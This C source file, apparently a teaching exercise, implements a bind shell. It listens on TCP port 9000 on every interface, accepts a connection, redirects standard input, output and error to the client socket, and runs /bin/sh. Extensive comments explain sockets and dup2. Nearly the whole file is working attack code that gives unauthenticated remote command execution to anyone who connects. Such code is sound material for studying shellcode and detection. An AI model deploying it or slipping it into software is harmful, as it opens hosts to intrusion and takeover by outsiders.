#include<stdio.h>
#include<stdlib.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>

#define BIND_PORT 9000

int main(){

	int socket_fd; //to store file descriptor
	/*
		AF_INET => AF-> Address Family
		AF_INET => is used for addressing socket that can be used
			   to communicate over a network

		SOCK_STEAM => STREAM SOCKETS over TCP
		SOCK_DGRAM => DATAGRAM SOCKETS over UDP
		SOCK_XXXXX => Other available options
	*/

	// A successful socket() call returns an positve integer value or else a negative value
	socket_fd = socket(AF_INET,SOCK_STREAM,0);

	if ( socket_fd < 0){
		printf("\nError occured; Cannot connet to socket\n");
		return -1;
	}else{
		printf("\nSuccessfully executed socket() call\n");
		setsockopt(socket_fd, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int));
		/*
			Structure of sockaddr_in at /usr/include/netinet/in.h

				struct sockaddr_in{
    				__SOCKADDR_COMMON (sin_);
    				in_port_t sin_port;      // Port number.
    				struct in_addr sin_addr; // Internet address. 
   				unsigned char sin_zero[sizeof (struct sockaddr) - __SOCKADDR_COMMON_SIZE - sizeof (in_port_t) - sizeof (struct in_addr)];
  			};


			In Simplified version

			struct sockaddr_in{
				short int sin_family;
				unsigned short int sin_port;
				struct in_addr sin addr;
				unsigned char sin_zero[8];

			}
		*/
		struct sockaddr_in my_addr;
		my_addr.sin_family = AF_INET;
		my_addr.sin_port = htons(BIND_PORT); // PORT to Listen ON
		my_addr.sin_addr.s_addr = INADDR_ANY;// will be available over all interfaces and not limited to particular IP / Interface
		memset(&(my_addr.sin_zero),'\0',8);// Fill the structure with NULLs for padding

		//bind will return zero on success, or negative number incase of error 
		int bind_fd;
		bind_fd = bind(socket_fd,(struct sockaddr *)&my_addr,sizeof(struct sockaddr));

		if( bind_fd != 0){
			printf("\nCannot bind!\n");
			return -1;
		}else{
			//for debugging purpose
			printf("\nSuccessfully Binded and size of sockaddr is %d\n",sizeof(struct sockaddr));
			// for debugging purpose
			printf("\nSize of sin family-%d , sin_port-%d , sin_addr.s_addr-%d, sin_zero-%d\n",sizeof(my_addr.sin_family),sizeof(my_addr.sin_port),sizeof(my_addr.sin_addr.s_addr),sizeof(my_addr.sin_zero));
			//listen for incoming connection
			listen(socket_fd,2);

			struct sockaddr_in their_addr;
			int sin_size,recvfd;
			sin_size = sizeof(struct sockaddr_in);
			printf("\nSize of sockaddr is %d\n",sizeof(struct sockaddr_in));
			recvfd = accept(socket_fd,(struct sockaddr *)&their_addr,&sin_size);
			if(recvfd == -1){
				printf("\nError in receiving connection\n");
				return -1;
			}else{
				printf("\nReceived an incoming connection\n");
				//int dup2(int oldfd, int newfd);
				//From Linux documentation : dup2() makes newfd be the copy of oldfd, closing newfd first if necessary
				/*
					After  a  successful return from one of these system calls, the old and
       					new file descriptors may be used interchangeably.  They  refer  to  the
       					same open file description (see open(2)) and thus share file offset and
       					file status flags; for example, if the file offset is modified by using
       					lseek(2)  on one of the descriptors, the offset is also changed for the
       					other.
				
					https://stackoverflow.com/questions/16185919/redirecting-output-of-server-to-client-socket
		
					https://www.cs.rutgers.edu/~pxk/416/notes/c-tutorials/dup2.html
					The kernel allows us to do this via the dup2 system call.
					The dup2(int f_orig, int f_new) system call takes two file descriptors as parameters and duplicates the first one (f_orig) onto the second one (f_new). 
					If the second file descriptor was referencing a file, that file is closed.
					After the system call, both file descriptors are valid references to the file.
				*/
				//--------------------------Code Begins for Bind TCP Mode-----------------------------------//
				// Redirect standard stdin,stdout, stderror of the system to the incoming clients fd
    				dup2(recvfd, 0);//all inputs will be taken via clients standard input
    				dup2(recvfd, 1);//all outputs will be redirectd to the  clients standard output
    				dup2(recvfd, 2);//all errors will be redicrectr to the clients standard error output
				//close(socket_fd);
    				// Execute shell
    				execve("/bin/sh", (char *[]){0}, (char *[]){0});
				close(socket_fd);
			}

		}


	}
	return 0;
}

